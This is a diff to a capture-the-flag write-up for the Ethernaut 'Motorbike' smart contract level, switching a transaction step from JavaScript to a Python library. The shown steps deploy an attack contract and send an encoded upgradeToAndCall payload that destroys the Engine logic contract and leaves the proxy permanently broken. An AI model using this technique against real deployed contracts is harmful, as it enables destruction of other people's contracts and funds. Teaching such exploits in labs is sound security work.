@@ -196,7 +196,7 @@ attackContract.deploy()
 2023-07-29 13:41:50.606 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x5bB7E9b41D2B0410a675F36af79B2510D3bfB734
 ```
 
-Next, replace the contract address of implementation slot in proxy with this attack contract. This requires us to call `function upgradeToAndCall(address newImplementation, bytes memory data)`: (`cheb3` at this moment doesn't support unsafe `sendTransaction`, so we still use js api for now)
+Next, replace the contract address of implementation slot in proxy with this attack contract. This requires us to call `function upgradeToAndCall(address newImplementation, bytes memory data)`:
 
 ```py
 >>> attackAddr = "0x5bB7E9b41D2B0410a675F36af79B2510D3bfB734"
@@ -204,11 +204,7 @@ Next, replace the contract address of implementation slot in proxy with this att
 '0x9e5faafc'
 >>> upgradeData = encode_with_signature("upgradeToAndCall(address,bytes)", attackAddr, bytes.fromhex(attackData[2:]))
 '0x4f1ef2860000000000000000000000005bb7e9b41d2b0410a675f36af79b2510d3bfb734000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000049e5faafc00000000000000000000000000000000000000000000000000000000'
-```
-
-```js
-> await web3.eth.sendTransaction({from: player, to: engine, data: upgradeData})
-{blockHash: '0x1b0875f85031017e0a1be2829e397af30dcb7e6ba8aeb2b0689cdfc4ed1b80d9', blockNumber: 9429775, contractAddress: null, cumulativeGasUsed: 1765592, effectiveGasPrice: 2500000075, …}
+>>> account.send_transaction(engine, data=upgradeData)
 ```
 
 Finally, submit the instance to pass the level. At this moment, the `Engine` is destroyed, and `Motorbike` is now useless. Since upgrade logic is all inside logic contract, `Motorbike` cannot be fixed.
